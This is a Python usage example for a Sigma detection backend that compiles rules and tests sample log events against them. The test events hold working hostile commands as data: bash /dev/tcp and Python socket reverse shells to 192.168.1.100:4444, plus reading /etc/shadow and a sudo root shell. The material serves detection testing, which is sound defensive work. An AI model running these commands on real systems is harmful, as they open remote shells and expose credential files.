#!/usr/bin/env python3
"""
Basic Usage Example for Sigma Simple Backend

This example demonstrates the basic functionality of the Sigma Simple Backend
including rule compilation, event testing, and alert handling.
"""

import sys
import os

# Add parent directory to path to import the backend
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sigma_simple_backend import (
    SimpleEvalBackend,
    RestrictivenessLevel,
    MockRuleCollection,
    Alert
)


def basic_usage_example():
    """Demonstrate basic usage of the Sigma Simple Backend"""
    
    print("=== Sigma Simple Backend - Basic Usage Example ===\n")
    
    # Initialize backend with different restrictiveness levels
    print("1. Initializing backends with different restrictiveness levels...")
    backends = {
        "Ultra-Restrictive": SimpleEvalBackend(restrictiveness=RestrictivenessLevel.ULTRA_RESTRICTIVE),
        "Restrictive": SimpleEvalBackend(restrictiveness=RestrictivenessLevel.RESTRICTIVE),
        "Balanced": SimpleEvalBackend(restrictiveness=RestrictivenessLevel.BALANCED),
        "Permissive": SimpleEvalBackend(restrictiveness=RestrictivenessLevel.PERMISSIVE),
    }
    
    # Load mock rules for testing
    print("2. Loading mock rule collection...")
    rule_collection = MockRuleCollection()
    
    # Sample test events
    test_events = [
        {
            "name": "Reverse Shell Command",
            "event": {
                "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                "_COMM": "bash",
                "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                "_PID": "12345",
            }
        },
        {
            "name": "Privilege Escalation Attempt",
            "event": {
                "MESSAGE": "sudo -u root /bin/bash",
                "_COMM": "sudo",
                "_CMDLINE": "sudo -u root /bin/bash",
                "_UID_NAME": "user",
            }
        },
        {
            "name": "Suspicious File Access",
            "event": {
                "MESSAGE": "cat /etc/shadow",
                "_COMM": "cat",
                "_CMDLINE": "cat /etc/shadow",
                "_EXE": "/bin/cat",
            }
        },
        {
            "name": "Normal Activity",
            "event": {
                "MESSAGE": "ls -la /home/user",
                "_COMM": "ls",
                "_CMDLINE": "ls -la /home/user",
                "_PID": "54321",
            }
        }
    ]
    
    # Test each backend against events
    for backend_name, backend in backends.items():
        print(f"\n=== Testing {backend_name} Backend ===")
        
        # Compile rules
        compiled_rules = backend.compile(rule_collection)
        print(f"Compiled {len(compiled_rules)} rules")
        
        # Test each event
        for test_case in test_events:
            print(f"\nTesting: {test_case['name']}")
            alerts = []
            
            for rule_func in compiled_rules:
                alert = backend.test_rule_against_event(rule_func, test_case['event'])
                if alert:
                    alerts.append(alert)
            
            if alerts:
                print(f"  ⚠️  {len(alerts)} alert(s) generated:")
                for alert in alerts:
                    print(f"    - {alert.rule_title} (Severity: {alert.severity})")
                    if alert.mitre_tactics:
                        print(f"      MITRE Tactics: {', '.join(alert.mitre_tactics)}")
                    if alert.mitre_techniques:
                        print(f"      MITRE Techniques: {', '.join(alert.mitre_techniques)}")
            else:
                print("  ✅ No alerts generated")


def demonstrate_alert_handling():
    """Demonstrate how to handle alerts properly"""
    
    print("\n\n=== Alert Handling Example ===\n")
    
    backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.BALANCED)
    rule_collection = MockRuleCollection()
    compiled_rules = backend.compile(rule_collection)
    
    # Malicious event
    malicious_event = {
        "MESSAGE": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.100\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "_COMM": "python3",
        "_CMDLINE": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.100\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "_PID": "9999",
        "_UID_NAME": "user",
        "_HOSTNAME": "workstation-01",
    }
    
    print("Processing malicious event...")
    print(f"Command: {malicious_event['_CMDLINE'][:80]}...")
    
    for rule_func in compiled_rules:
        alert = backend.test_rule_against_event(rule_func, malicious_event)
        if alert:
            handle_security_alert(alert, malicious_event)


def handle_security_alert(alert: Alert, event: dict):
    """Example alert handler function"""
    
    print(f"\n🚨 SECURITY ALERT DETECTED 🚨")
    print(f"Rule: {alert.rule_title}")
    print(f"Rule ID: {alert.rule_id}")
    print(f"Severity: {alert.severity}")
    print(f"Description: {alert.description}")
    
    if alert.mitre_tactics:
        print(f"MITRE ATT&CK Tactics: {', '.join(alert.mitre_tactics)}")
    
    if alert.mitre_techniques:
        print(f"MITRE ATT&CK Techniques: {', '.join(alert.mitre_techniques)}")
    
    print("\nEvent Details:")
    for key, value in event.items():
        if key.startswith('_') or key in ['MESSAGE']:
            print(f"  {key}: {value}")
    
    # Here you could add:
    # - Send alert to SIEM
    # - Log to file
    # - Send notification
    # - Block IP/user
    # - Etc.


if __name__ == "__main__":
    try:
        basic_usage_example()
        demonstrate_alert_handling()
        
        print("\n=== Example completed successfully! ===")
        print("\nNext steps:")
        print("- Try modifying the restrictiveness levels")
        print("- Add your own test events")
        print("- Implement custom alert handling")
        print("- Integrate with your logging infrastructure")
        
    except Exception as e:
        print(f"Error running example: {e}")
        import traceback
        traceback.print_exc() 